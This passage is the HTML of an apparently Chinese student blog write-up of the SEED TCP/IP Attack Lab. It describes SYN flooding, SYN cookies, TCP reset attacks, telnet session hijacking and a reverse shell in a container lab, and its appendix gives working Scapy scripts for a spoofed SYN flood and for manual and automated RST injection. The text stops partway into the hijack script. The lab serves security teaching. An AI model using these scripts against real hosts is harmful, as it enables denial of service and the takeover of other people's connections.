@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/fire32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fire16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.mrdothing.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="一.实验目标本本实验室的学习目标是让学生获得关于脆弱性的第一手经验正如针对这些漏洞的攻击一样。聪明人从错误中学习。在安全教育中，我们研究导致软件漏洞的错误。研究过去的错误不仅对学生有帮助理解为什么系统是脆弱的，为什么一个看似善意的错误会变成一场灾难，以及为什么需要许多安全机制。更重要的是，它还可以帮助学生学习常见的模式这样他们就可以避免在将来犯类似的错误。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCP&#x2F;IP Attack Lab">
+<meta property="og:url" content="https://www.mrdothing.com/2022/11/20/Tcp_Attack/index.html">
+<meta property="og:site_name" content="Mr.Dothing">
+<meta property="og:description" content="一.实验目标本本实验室的学习目标是让学生获得关于脆弱性的第一手经验正如针对这些漏洞的攻击一样。聪明人从错误中学习。在安全教育中，我们研究导致软件漏洞的错误。研究过去的错误不仅对学生有帮助理解为什么系统是脆弱的，为什么一个看似善意的错误会变成一场灾难，以及为什么需要许多安全机制。更重要的是，它还可以帮助学生学习常见的模式这样他们就可以避免在将来犯类似的错误。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181642214.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181642196.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181642509.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181642408.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181643671.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181643268.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181643966.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181643055.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181644511.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181644241.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181645059.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181646850.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181646318.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181646910.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181647505.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181647563.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181647123.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181647600.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181648610.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181648434.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181648308.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181648715.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181649710.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181649459.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181649824.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181649430.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181650238.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181650833.png">
+<meta property="article:published_time" content="2022-11-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-09-18T10:44:31.700Z">
+<meta property="article:author" content="Crazyoo">
+<meta property="article:tag" content="seedlab2.0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181642214.png">
+
+<link rel="canonical" href="https://www.mrdothing.com/2022/11/20/Tcp_Attack/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>TCP/IP Attack Lab | Mr.Dothing</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mr.Dothing</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://www.mrdothing.com/2022/11/20/Tcp_Attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Crazyoo">
+      <meta itemprop="description" content="You get what you get.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mr.Dothing">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TCP/IP Attack Lab
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-11-20 00:00:00" itemprop="dateCreated datePublished" datetime="2022-11-20T00:00:00+08:00">2022-11-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-09-18 18:44:31" itemprop="dateModified" datetime="2023-09-18T18:44:31+08:00">2023-09-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">软件安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="一-实验目标"><a href="#一-实验目标" class="headerlink" title="一.实验目标"></a>一.实验目标</h2><p>本本实验室的学习目标是让学生获得关于脆弱性的第一手经验正如针对这些漏洞的攻击一样。聪明人从错误中学习。在安全教育中，我们研究导致软件漏洞的错误。研究过去的错误不仅对学生有帮助理解为什么系统是脆弱的，为什么一个看似善意的错误会变成一场灾难，以及为什么需要许多安全机制。更重要的是，它还可以帮助学生学习常见的模式这样他们就可以避免在将来犯类似的错误。</p>
+<span id="more"></span>
+<p>此外，利用漏洞通过案例研究，学生可以学习安全设计、安全编程和安全测试的原理。TCP&#x2F;IP协议中的漏洞代表了协议设计和实现中特殊类型的漏洞;它们提供了一个宝贵的教训，说明为什么应该从是开始，而不是作为事后的补充。此外，研究这些漏洞有助于学生理解网络安全的挑战，以及为什么需要采取许多网络安全措施。</p>
+<p>在这个实验中，学生将对TCP进行几次攻击。本实验室涵盖以下主题:</p>
+<p>•TCP协议</p>
+<p>•TCP SYN flood攻击和SYN cookies</p>
+<p>•TCP重置攻击</p>
+<p>•TCP会话劫持攻击</p>
+<p>•反向shell</p>
+<h2 id="二-实验原理"><a href="#二-实验原理" class="headerlink" title="二.实验原理"></a>二.实验原理</h2><h3 id="2-1-TCP-x2F-IP协议"><a href="#2-1-TCP-x2F-IP协议" class="headerlink" title="2.1 TCP&#x2F;IP协议"></a>2.1 TCP&#x2F;IP协议</h3><p>TCP&#x2F;IP（Transmission Control Protocol&#x2F;Internet Protocol，传输控制协议&#x2F;互联网协议）是互联网的基本协议，也是国际互联网络的基础。TCP&#x2F;IP 不是指一个协议，也不是 TCP 和 IP 这两个协议的合称，而是一个协议族，包括多个网络协议，比如 IP、ICMP（Internet Control Message Protocol，互联网控制报文协议）、TCP、HTTP（Hyper Text Transfer Protocol，超文本传输协议）、FTP（File Transfer Protocol，文件传输协议）、POP3（Post Office Protocol version 3，邮局协议）等。TCP&#x2F;IP 定义了计算机操作系统如何连入互联网，以及数据传输的标准。TCP&#x2F;IP 是为了解决不同系统的计算机之间的传输通信而提出的一个标准，不同系统的计算机采用了同一种协议后，就能相互通信，从而能够建立网络连接，实现资源共享和网络通信。</p>
+<h3 id="2-2-拓扑搭建"><a href="#2-2-拓扑搭建" class="headerlink" title="2.2 拓扑搭建"></a>2.2 拓扑搭建</h3><p>在这个实验室里，我们至少需要三台机器。我们使用容器来设置实验室环境。图1描述实验室设置。我们将使用攻击者容器来发起攻击，同时使用其他三个容器容器作为受害者和用户机器。我们假设所有这些机器都在同一个局域网上。学生这个实验室也可以使用三个虚拟机，但是使用容器会方便得多。</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181642214.png"></p>
+<h2 id="三-实验器材"><a href="#三-实验器材" class="headerlink" title="三.实验器材"></a>三.实验器材</h2><p>1．Ubuntu20.04。</p>
+<p>2．Wireshark等常用捕包工具。</p>
+<h2 id="四-实验步骤及运行结果"><a href="#四-实验步骤及运行结果" class="headerlink" title="四.实验步骤及运行结果"></a>四.实验步骤及运行结果</h2><h3 id="4-1-Task-1-SYN-Flooding-Attack"><a href="#4-1-Task-1-SYN-Flooding-Attack" class="headerlink" title="4.1 Task 1: SYN Flooding Attack"></a>4.1 Task 1: SYN Flooding Attack</h3><p>SYN flood是DoS攻击的一种形式，攻击者向受害者的TCP端口发送大量SYN请求攻击者无意完成3次握手过程。攻击者要么使用欺骗的IP处理或不继续此过程。通过这种攻击，攻击者可以淹没受害者的队列，即用于半打开的连接，即已经完成SYN, SYN- ack，但还没有得到了最终的ACK。当此队列已满时，受害者不能再接受任何连接。</p>
+<h4 id="4-1-1-Task-1-1-Launching-the-Attack-Using-Python"><a href="#4-1-1-Task-1-1-Launching-the-Attack-Using-Python" class="headerlink" title="4.1.1 Task 1.1: Launching the Attack Using Python"></a>4.1.1 Task 1.1: Launching the Attack Using Python</h4><p>根据实验手册中所给出的代码进行编写，需要完善IP地址，端口号以及转发网卡的补充。根据实验原理可知telnet应该使用23号端口进行接收。然后进行攻击如下：</p>
+<p>首先在攻击者主机中执行SYN泛洪攻击的python程序</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181642196.png"></p>
+<p>在受害者主机中查看收到的SYN请求，发现使用了61个</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181642509.png"></p>
+<p>由于此前限制了其地址池共有80个，根据手册中的指导可以得知可以使用四分之三即60个，多出的一个是已经在USER1和受害者主机之间建立的telnet连接时使用的。</p>
+<p>在USER1主机中退出telnet连接，再重新登录，发现仍然可以与受害者主机成功建立连接，其原因在于受害者主机中地址池剩余的四分之一便是留给已经建立过连接的主机，让其下次登录仍然可以成功，因而攻击会失败。如下图：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181642408.png"></p>
+<p>根据失败的原因，我们可以重新实施攻击，应该首先在受害者主机中清理掉与USER1主机中所建立的信息，然后再重新进行攻击，如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181643671.png"></p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181643268.png"></p>
+<p>如图所示，在USER1主机中无法与受害者主机建立连接，证明攻击成功。</p>
+<p>在实验过程中，发现在执行python程序后，需要等待一段时间才可以成功实施攻击，为了提高攻击效率，可以进行如下操作：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181643966.png"></p>
+<p>并发的执行攻击脚本，可以加快受害者主机中地址池的耗尽速度，从而更快的实现攻击</p>
+<h4 id="4-1-2-Task-1-2-Launch-the-Attack-Using-C"><a href="#4-1-2-Task-1-2-Launch-the-Attack-Using-C" class="headerlink" title="4.1.2 Task 1.2: Launch the Attack Using C"></a>4.1.2 Task 1.2: Launch the Attack Using C</h4><p>利用所给出的C程序进行攻击，如下图所示：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181643055.png"></p>
+<p>相比于python程序，发现C程序在执行后无需等待，即可攻击成功，也无需并行执行攻击。</p>
+<h4 id="4-1-3-Task-1-3-Enable-the-SYN-Cookie-Countermeasure"><a href="#4-1-3-Task-1-3-Enable-the-SYN-Cookie-Countermeasure" class="headerlink" title="4.1.3 Task 1.3: Enable the SYN Cookie Countermeasure"></a>4.1.3 Task 1.3: Enable the SYN Cookie Countermeasure</h4><p>请启用SYN cookie机制，并再次运行您的攻击，并比较结果。</p>
+<p>首先在受害者主机中启用SYN cookie机制，如下图：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181644511.png"></p>
+<p>然后再攻击者主机中执行攻击如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181644241.png"></p>
+<p>发现在USER1主机中，仍然可以成功建立telnet连接：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181645059.png"></p>
+<p>证明SYN cookie机制可以成功抵御SYN泛洪攻击</p>
+<h3 id="4-2-Task-2-TCP-RST-Attacks-on-telnet-Connections"><a href="#4-2-Task-2-TCP-RST-Attacks-on-telnet-Connections" class="headerlink" title="4.2 Task 2: TCP RST Attacks on telnet Connections"></a>4.2 Task 2: TCP RST Attacks on telnet Connections</h3><p>Manual attack</p>
+<p>在USER1和受害者主机建立好telnet连接时，利用wireshark进行抓包如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181646850.png"></p>
+<p>从抓包内容中，我们可以得到最新的序列号，认证号以及在USER1主机中建立telnet连接时所使用的端口号，从而可以在python代码中完善相关内容，然后执行程序，即可断开USER1与受害者之间的telnet连接，如下：</p>
+<p>在USER1主机中，连接被断开：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181646318.png"></p>
+<p>在受害者主机中，也可以查看到连接被断开：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181646910.png"></p>
+<p>但是这种攻击存在一定的缺陷，由于在USER1和受害者主机中建立连接后，USER1可能会不断从键盘上进行输入，而攻击时通过伪造USER1，向受害者主机发送报文实现的，当用户进行输入时，其序列号会发生改变，从而导致攻击失败，因此进行自动化的攻击，可以随时实现成功攻击。</p>
+<p>其原理主要在于通过嗅探过滤得到来自于受害则主机的的数据包，利用该数据包进行伪造，从而得到对应的seq和ack以及端口号，因为是嗅探得到的，所以无需每次去抓包得到正确的序列号。</p>
+<p>攻击具体过程如下所示：</p>
+<p>首先在攻击者主机中，执行python程序，</p>
+<p>其具体代码如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181647505.png"></p>
+<p>在USER1主机中，可以观察到连接被断开：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181647563.png"></p>
+<p>在受害者主机中和，也可以观察到前后的连接状况：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181647123.png"></p>
+<p>证明其是自动化实施的攻击，我们可以在USER1与受害者建立telnet连接前，执行攻击脚本，然后再USER1主机中，可以观察到如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181647600.png"></p>
+<p>发现在登录过程中，该连接即被中断，在wireshark中，也可以抓包到如下内容：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181648610.png"></p>
+<p>证明攻击成功。</p>
+<h3 id="4-3-Task-3-TCP-Session-Hijacking"><a href="#4-3-Task-3-TCP-Session-Hijacking" class="headerlink" title="4.3 Task 3: TCP Session Hijacking"></a>4.3 Task 3: TCP Session Hijacking</h3><p>TCP会话劫持攻击的目的是劫持一个已存在的TCP连接(会话)通过向会话中注入恶意内容，导致两个受害者。如果此连接是telnet会话，攻击者可以在此会话中注入恶意命令(例如删除重要文件)，使受害者执行恶意命令。在这个任务中，你需要演示如何劫持两台计算机之间的Telnet会话。您的目标是获得telnet服务器从您那里运行恶意命令。为了简化任务，我们假设攻击者和受害者在同一个局域网。</p>
+<p>攻击过程如下：</p>
+<p>为了证明后续攻击实施成功，首先在受害者主机中，创建一个秘密文件，如下图：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181648434.png"></p>
+<p>然后在USER1主机上与受害者建立telnet连接，并利用wireshark进行抓包，利用抓包得到的内容完善python程序，如下图：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181648308.png"></p>
+<p>然后再攻击者主机上执行python脚本，即可成功执行注入的恶意代码，读取受害者主机上的秘密文件：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181648715.png"></p>
+<p>同实验二中的攻击，该攻击存在一定的局限性，因而尝试利用嗅探数据包，重新完善python程序，实现自动化攻击如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181649710.png"></p>
+<p>在受害者主机中，我们也可以查看到攻击者主机利用9090端口与受害者主机建立过连接，但是随后就被断开，因而显示超时。</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181649459.png"></p>
+<p>攻击成功</p>
+<h3 id="4-4-Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking"><a href="#4-4-Task-4-Creating-Reverse-Shell-using-TCP-Session-Hijacking" class="headerlink" title="4.4 Task 4: Creating Reverse Shell using TCP Session Hijacking"></a>4.4 Task 4: Creating Reverse Shell using TCP Session Hijacking</h3><p>攻击过程如下：</p>
+<p>首先在USER1主机上与受害者建立telnet连接，然后在攻击者主机中，在9090端口监听并且执行python脚本，如下图：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181649824.png"></p>
+<p>并且在受害者主机中可以查看到，当前网络中的连接如下：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181649430.png"></p>
+<p>可以观察到攻击者成功与受害者主机建立了连接，并且在攻击者主机上得到一个受害者主机的shell，但是该shell只是seed用户下的，并没有超级用户权限，如下图：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181650238.png"></p>
+<p>我们可以执行su命令，来得到root权限，如下图：</p>
+<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181650833.png"></p>
+<h2 id="五-附件"><a href="#五-附件" class="headerlink" title="五.附件"></a>五.附件</h2><p>Task1.1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> IP, TCP, send</span><br><span class="line"><span class="keyword">from</span> ipaddress <span class="keyword">import</span> IPv4Address</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line">ip = IP(dst=<span class="string">&quot;10.9.0.5&quot;</span>) <span class="comment"># victim</span></span><br><span class="line">tcp = TCP(dport=<span class="number">23</span>, flags=<span class="string">&#x27;S&#x27;</span>) <span class="comment"># telnet 23</span></span><br><span class="line">pkt = ip/tcp</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    pkt[IP].src = <span class="built_in">str</span>(IPv4Address(getrandbits(<span class="number">32</span>))) <span class="comment"># source ip</span></span><br><span class="line">    pkt[TCP].sport = getrandbits(<span class="number">16</span>) <span class="comment"># source port</span></span><br><span class="line">    pkt[TCP].seq = getrandbits(<span class="number">32</span>) <span class="comment"># sequence number</span></span><br><span class="line">    send(pkt, iface = <span class="string">&#x27;br-579a2284e98b&#x27;</span>, verbose = <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Task1.2</p>
+<table>
+<thead>
+<tr>
+<th>实验的配置中已经给出了c语言代码</th>
+</tr>
+</thead>
+</table>
+<p>Task2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#手动脚本</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 需要利用 wireshark 进行抓包填写端口号和 seq</span></span><br><span class="line">ip = IP(src=<span class="string">&quot;10.9.0.6&quot;</span>, dst=<span class="string">&quot;10.9.0.5&quot;</span>) <span class="comment"># impersonate the usr</span></span><br><span class="line">tcp = TCP(sport=<span class="number">45908</span>, dport=<span class="number">23</span>, flags=<span class="string">&quot;R&quot;</span>, seq=<span class="number">72446585</span>)</span><br><span class="line">pkt = ip/tcp</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt, iface=<span class="string">&quot;br-579a2284e98b&quot;</span>, verbose=<span class="number">0</span>)</span><br><span class="line"><span class="comment">#自动脚本</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 利用嗅探数据包并且过滤得到来自于受害者主机的数据包，利用该数据包进行伪</span></span><br><span class="line">造</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_tcp</span>(<span class="params">pkt</span>):</span><br><span class="line">    IPLayer = IP(dst = pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">    TCPLayer = TCP(flags=<span class="string">&quot;R&quot;</span>, seq=pkt[TCP].ack,</span><br><span class="line">                   dport=pkt[TCP].sport, sport=pkt[TCP].dport)</span><br><span class="line">    spoofpkt = IPLayer/TCPLayer</span><br><span class="line">    ls(spoofpkt)</span><br><span class="line">    send(spoofpkt, verbose=<span class="number">0</span>)</span><br><span class="line">    pkt=sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=<span class="string">&#x27;tcp and port 23&#x27;</span>, prn=spoof_tcp)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Task3</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#手动脚本：</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 利用 wireshark 抓包得到端口号，seq 